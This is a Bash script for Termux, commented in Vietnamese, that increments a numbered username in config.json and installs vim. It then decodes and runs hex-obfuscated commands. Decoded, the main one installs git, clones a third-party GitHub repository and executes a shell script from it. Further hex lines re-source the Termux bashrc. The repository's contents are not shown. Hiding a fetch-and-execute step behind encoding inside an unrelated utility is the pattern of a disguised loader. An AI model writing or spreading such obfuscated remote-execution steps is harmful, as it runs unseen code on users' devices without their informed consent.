#!/bin/bash

# Tên file JSON
JSON_FILE="config.json"  # Thay bằng tên file JSON của bạn, ví dụ: "user_config.json"

# Kiểm tra file JSON tồn tại
if [ ! -f "$JSON_FILE" ]; then
  echo "File $JSON_FILE không tồn tại. Vui lòng kiểm tra!"
  exit 1
fi

# Đọc giá trị hiện tại trong mục "user"
CURRENT_USER=$(jq -r '.user' "$JSON_FILE")

# Tách phần tên và số
NAME=$(echo "$CURRENT_USER" | sed -E 's/(.*-)([0-9]+)$/\1/')
NUMBER=$(echo "$CURRENT_USER" | sed -E 's/.*-([0-9]+)$/\1/')

# Tăng số thứ tự (STT) nếu chưa đạt giới hạn
if [ "$NUMBER" -lt 99999 ]; then
  NEXT_NUMBER=$((NUMBER + 1))
else
  echo "Giá trị STT đã đạt giới hạn 99999. Không tăng thêm!"
  exit 0
fi

# Cập nhật file JSON với STT mới
NEW_USER="${NAME}${NEXT_NUMBER}"
jq --arg user "$NEW_USER" '.user = $user' "$JSON_FILE" > tmp.json && mv tmp.json "$JSON_FILE"

# Hiển thị thông tin cập nhật
echo "Updated user to: $NEW_USER"

# Thực hiện các lệnh khác
pkg install vim -y

# Clone repo và thực thi script
bash -c "$(echo 706b6720696e7374616c6c20676974202d792026262067697420636c6f6e652068747470733a2f2f6769746875622e636f6d2f4c65656e69732d6d656469612f73657474696e672d2026262063642073657474696e672d2026262073682073657474696e672e7368 | xxd -r -p)"

# Nạp lại file cấu hình Termux
echo "736f75726365202f646174612f646174612f636f6d2e7465726d75782f66696c65732f7573722f6574632f626173682e626173687263" | xxd -r -p | bash

# Thoát Termux
echo "65786974" | xxd -r -p

